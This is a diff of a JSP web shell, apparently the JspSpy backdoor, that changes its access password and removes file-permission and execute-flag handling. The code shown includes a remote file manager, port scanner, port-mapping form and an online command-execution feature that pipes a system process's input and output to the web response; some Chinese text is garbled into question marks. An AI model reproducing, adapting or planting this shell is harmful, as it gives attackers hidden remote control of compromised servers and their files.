@@ -1,4 +1,4 @@
-﻿<%@page pageEncoding="utf-8"%>
+<%@page pageEncoding="utf-8"%>
 <%@page import="java.io.*"%>
 <%@page import="java.util.*"%>
 <%@page import="java.util.regex.*"%>
@@ -20,7 +20,7 @@
 * Blog http://www.Forjj.com/
 * Yue . I Love You.
 */
-private static final String PW = "ninty"; //password
+private static final String PW = "592714"; //password
 private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 private static final String REQUEST_CHARSET = "ISO-8859-1";
 private static final String PAGE_CHARSET = "UTF-8";
@@ -718,7 +718,7 @@ out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\
 "<h2 id=\"Bin_H2_Title\">PortScan &gt;&gt;</h2>"+
 "<div id=\"YwLB\"><form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<p><input type=\"hidden\" value=\"portScan\" name=\"o\">"+
-"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout （秒） : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
+"IP : <input name=\"ip\" type=\"text\" value=\""+ip+"\" id=\"ip\" class=\"input\" style=\"width:10%;margin:0 8px;\" /> Port : <input name=\"ports\" type=\"text\" value=\""+ports+"\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout ?????? : <input name=\"timeout\" type=\"text\" value=\""+timeout+"\" id=\"timeout\" class=\"input\" size=\"5\" style=\"margin:0 8px;\" /> <input type=\"submit\" name=\"submit\" value=\"Scan\" id=\"submit\" class=\"bt\" />"+
 "</p>"+
 "</form></div>"+
 "</td></tr></table>");
@@ -1015,7 +1015,6 @@ PrintWriter out = response.getWriter();
 String path = request.getParameter("folder");
 if (Util.isEmpty(path))
 path = JSession.getAttribute(CURRENT_DIR).toString();
-
 JSession.setAttribute(CURRENT_DIR,Util.convertPath(path));
 File file = new File(path);
 if (!file.exists()) {
@@ -1032,7 +1031,7 @@ cr = JSession.getAttribute(CURRENT_DIR).toString().substring(0,3);
 cr = "/";
 }
 File currentRoot = new File(cr);
-out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total "+Util.getSize(currentRoot.getTotalSpace(),'G')+"</h2>");
+out.println("<h2>File Manager - Current disk &quot;"+(cr.indexOf("/") == 0?"/":currentRoot.getPath())+"&quot; total  (unknow) </h2>");
 out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<table width=\"98%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">"+
 "  <tr>"+
@@ -1082,7 +1081,7 @@ out.println("<tr class=\"alt2\" onMouseOver=\"this.className='focus';\" onMouseO
 "<td><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).subdir()\">"+f.getName()+"</a></td>"+
 "<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
 "<td nowrap>--</td>"+
-"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / "+f.canExecute()+"</td>"+
+"<td nowrap>"+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
 "<td nowrap><a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).removedir()\">Del</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).move()\">Move</a> | <a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"',filename:'"+f.getName()+"'}).pack()\">Pack</a></td>"+
 "</tr>");
 } else {
@@ -1093,7 +1092,7 @@ out.println("<tr class=\"alt1\" onMouseOver=\"this.className='focus';\" onMouseO
 "<td nowrap>"+Util.formatDate(f.lastModified())+"</td>"+
 "<td nowrap>"+Util.getSize(f.length(),'B')+"</td>"+
 "<td nowrap>"+
-""+f.canRead()+" / "+f.canWrite()+" / "+f.canExecute()+"</td>"+
+""+f.canRead()+" / "+f.canWrite()+" / unknow </td>"+
 "<td nowrap>"+
 "<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).vEdit()\">Edit</a> | "+
 "<a href=\"javascript:new fso({path:'"+Util.convertPath(f.getAbsolutePath())+"'}).down()\">Down</a> | "+
@@ -1292,10 +1291,9 @@ if (!f.exists())
 return;
 String read = f.canRead() ? "checked=\"checked\"" : "";
 String write = f.canWrite() ? "checked=\"checked\"" : "";
-String execute = f.canExecute() ? "checked=\"checked\"" : "";
+String execute = "";
 Calendar cal = Calendar.getInstance();
 cal.setTimeInMillis(f.lastModified());
-
 out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"+
 "<form name=\"form1\" id=\"form1\" action=\""+SHELL_NAME+"\" method=\"post\" >"+
 "<h2>Set File Property &raquo;</h2>"+
@@ -1341,30 +1339,14 @@ String f = request.getParameter("file");
 File file = new File(f);
 if (!file.exists())
 return;
-String read = request.getParameter("read");
-String write = request.getParameter("write");
-String execute = request.getParameter("execute");
+
 String year = request.getParameter("year");
 String month = request.getParameter("month");
 String date = request.getParameter("date");
 String hour = request.getParameter("hour");
 String minute = request.getParameter("minute");
 String second = request.getParameter("second");
-if (Util.isEmpty(read)) {
-file.setReadable(false);
-} else {
-file.setReadable(true);
-}
-if (Util.isEmpty(write)) {
-file.setWritable(false);
-} else {
-file.setWritable(true);
-}
-if (Util.isEmpty(execute)) {
-file.setExecutable(false);
-} else {
-file.setExecutable(true);
-}
+
 Calendar cal = Calendar.getInstance();
 cal.set(Calendar.YEAR,Integer.parseInt(year));
 cal.set(Calendar.MONTH,Integer.parseInt(month)-1);
@@ -1815,13 +1797,11 @@ Object localPort = JSession.getAttribute("localPort");
 Object remoteIP = JSession.getAttribute("remoteIP");
 Object remotePort = JSession.getAttribute("remotePort");
 Object done = JSession.getAttribute("done");
-
 JSession.removeAttribute("localIP");
 JSession.removeAttribute("localPort");
 JSession.removeAttribute("remoteIP");
 JSession.removeAttribute("remotePort");
 JSession.removeAttribute("done");
-
 if (Util.isEmpty(localIP))
 localIP = InetAddress.getLocalHost().getHostAddress();
 if (Util.isEmpty(localPort))
@@ -1832,7 +1812,6 @@ if (Util.isEmpty(remotePort))
 remotePort = "80";
 if (!Util.isEmpty(done))
 Util.outMsg(out,done.toString());
-
 out.println("<form action=\""+SHELL_NAME+"\" method=\"post\">"+
 "<input type=\"hidden\" name=\"o\" value=\"mapPort\">"+
 "  <table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
@@ -2231,7 +2210,7 @@ OnLineProcess olp = new OnLineProcess(pro);
 JSession.setAttribute(SHELL_ONLINE,olp);
 new OnLineConnector(new ByteArrayInputStream(outs.toByteArray()),pro.getOutputStream(),"exeOclientR",olp).start();
 new OnLineConnector(pro.getInputStream(),response.getOutputStream(),"exeRclientO",olp).start();
-new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//错误信息流。
+new OnLineConnector(pro.getErrorStream(),response.getOutputStream(),"exeRclientO",olp).start();//?????????
 Thread.sleep(1000 * 60 * 60 * 24);
 } else if (type.equals("ecmd")) {
 Object o = JSession.getAttribute(SHELL_ONLINE);
